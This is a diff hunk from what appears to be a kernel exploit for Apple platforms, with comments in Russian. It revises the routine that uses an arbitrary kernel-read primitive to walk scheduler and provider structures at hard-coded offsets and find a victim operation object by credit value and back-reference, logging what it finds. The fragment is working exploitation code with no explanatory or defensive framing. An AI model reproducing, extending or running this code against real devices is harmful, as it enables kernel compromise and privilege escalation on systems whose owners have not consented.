@@ -6787,18 +6787,41 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t vcE = kpM2TClientVA(r, isTable, victim, @"opcE-victim");
         uint64_t ucE = kpLooksLikeKernelPointer(vcE) ? kp_untag_ptr(early_kread64(vcE + 0x30)) : 0;
         uint64_t provE = kpLooksLikeKernelPointer(ucE) ? kp_untag_ptr(early_kread64(ucE + 0xe8)) : 0;
-        uint64_t opE = 0;
+        // 1.9.232: массивы на SCHEDULER'е ([prov+0xb8]), не на prov (старый оракул
+        // 1.9.147 именно там их находил); матч по credit=0x10 ([op+0xc38] hi32 —
+        // доказано оракулом), UC back-ref вторым критерием; дамп counts при промахе.
+        uint64_t schedE = 0;
         if (kpLooksLikeKernelPointer(provE) && kpSafeToRead(provE)) {
-            uint64_t arraysE[2] = { kp_untag_ptr(early_kread64(provE + 0xc8)), kp_untag_ptr(early_kread64(provE + 0x110)) };
-            uint64_t countsE[2] = { early_kread64(provE + 0xb8), early_kread64(provE + 0x100) };
+            uint64_t c = kp_untag_ptr(early_kread64(provE + 0xb8));
+            uint64_t cnt0 = kpLooksLikeKernelPointer(c) ? early_kread64(c + 0xb8) : 0;
+            uint64_t a1 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0xc8)) : 0;
+            uint64_t a2 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0x110)) : 0;
+            if (kpLooksLikeKernelPointer(c) && cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) schedE = c;
+            else {
+                cnt0 = early_kread64(provE + 0xb8);
+                a1 = kp_untag_ptr(early_kread64(provE + 0xc8));
+                a2 = kp_untag_ptr(early_kread64(provE + 0x110));
+                if (cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) schedE = provE;
+            }
+        }
+        uint64_t opE = 0;
+        if (kpLooksLikeKernelPointer(schedE) && kpSafeToRead(schedE)) {
+            uint64_t arraysE[2] = { kp_untag_ptr(early_kread64(schedE + 0xc8)), kp_untag_ptr(early_kread64(schedE + 0x110)) };
+            uint64_t countsE[2] = { early_kread64(schedE + 0xb8), early_kread64(schedE + 0x100) };
+            kpNote(r, [NSString stringWithFormat:@"  [OPC-E] sched=%#llx counts=%llu/%llu arr=%#llx/%#llx",
+                      (unsigned long long)schedE, countsE[0], countsE[1], (unsigned long long)arraysE[0], (unsigned long long)arraysE[1]]);
             for (int ai = 0; ai < 2 && !opE; ai++) {
                 uint64_t arr = arraysE[ai];
                 uint64_t cnt = countsE[ai]; if (cnt > 256) cnt = 256;
                 if (!kpLooksLikeKernelPointer(arr)) continue;
+                int nDump = 0;
                 for (uint64_t i = 0; i < cnt && !opE; i++) {
                     uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
                     if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
-                    if (kp_untag_ptr(early_kread64(op + 0x48)) == ucE) { opE = op; break; }
+                    uint32_t credit = (uint32_t)(early_kread64(op + 0xc38) >> 32);
+                    uint64_t backref = kp_untag_ptr(early_kread64(op + 0x48));
+                    if (nDump < 4) { kpNote(r, [NSString stringWithFormat:@"    op[%llu]=%#llx credit=%#x back=%#llx", i, (unsigned long long)op, credit, (unsigned long long)backref]); nDump++; }
+                    if (credit == 0x10 || backref == ucE) { opE = op; break; }
                 }
             }
         }
